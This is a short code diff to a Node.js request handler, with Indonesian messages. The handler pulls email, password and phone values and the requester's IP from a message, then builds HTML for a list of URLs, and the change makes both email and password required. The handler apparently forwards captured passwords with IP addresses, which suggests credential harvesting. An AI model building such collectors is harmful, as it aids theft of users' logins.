@@ -359,18 +359,15 @@ module.exports = async (req, res) => {
 
     const vars = extractVars(pesan);
     vars.ip = getIP(req);
-     const hasRequiredData =
-  (vars.password && vars.password !== "-") ||
-  (vars.email && vars.email !== "-") ||
-  (vars.phone && vars.phone !== "-");
-
-if (!hasRequiredData) {
-  return res.json({
+     if (
+  vars.email === "-" ||
+  vars.password === "-"
+) {
+  return res.status(400).json({
     success: false,
-    message: "Tidak ada data yang valid"
+    message: "Data belum lengkap"
   });
 }
-
     const html = buildHtml(vars);
 
     const urls = loadUrls();
